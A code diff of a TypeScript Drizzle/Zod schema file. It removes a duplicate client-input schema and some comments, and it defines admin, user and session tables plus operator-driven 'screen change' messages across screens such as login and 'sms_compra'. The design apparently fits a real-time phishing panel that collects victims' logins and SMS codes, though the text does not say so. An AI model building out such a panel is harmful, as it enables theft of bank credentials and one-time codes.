@@ -1,3 +1,4 @@
+
 import { pgTable, text, serial, integer, boolean, timestamp } from "drizzle-orm/pg-core";
 import { createInsertSchema } from "drizzle-zod";
 import { z } from "zod";
@@ -13,14 +14,6 @@ export const adminUsers = pgTable("admin_users", {
 
 export const insertAdminSchema = createInsertSchema(adminUsers);
 export type AdminUser = typeof adminUsers.$inferSelect;
-
-export const clientInputSchema = z.object({
-  tipo: z.string(),
-  sessionId: z.string(),
-  data: z.record(z.any()),
-});
-
-export type ClientInputData = z.infer<typeof clientInputSchema>;
 
 export const users = pgTable("users", {
   id: serial("id").primaryKey(),
@@ -38,7 +31,6 @@ export const insertUserSchema = createInsertSchema(users).pick({
 export type InsertUser = z.infer<typeof insertUserSchema>;
 export type User = typeof users.$inferSelect;
 
-// Session represents a client connection
 export const sessions = pgTable("sessions", {
   id: serial("id").primaryKey(),
   sessionId: text("session_id").notNull().unique(),
@@ -70,7 +62,6 @@ export const insertSessionSchema = createInsertSchema(sessions).pick({
 export type InsertSession = z.infer<typeof insertSessionSchema>;
 export type Session = typeof sessions.$inferSelect;
 
-// Define screen types for type safety
 export enum ScreenType {
   FOLIO = "folio",
   LOGIN = "login",
@@ -85,7 +76,6 @@ export enum ScreenType {
   SMS_COMPRA = "sms_compra",
 }
 
-// Schema for screen change messages
 export const screenChangeSchema = z.object({
   tipo: z.string(),
   sessionId: z.string(),
@@ -100,7 +90,6 @@ export const screenChangeSchema = z.object({
 
 export type ScreenChangeData = z.infer<typeof screenChangeSchema>;
 
-// Schema for client data input
 export const clientInputSchema = z.object({
   tipo: z.string(),
   sessionId: z.string(),
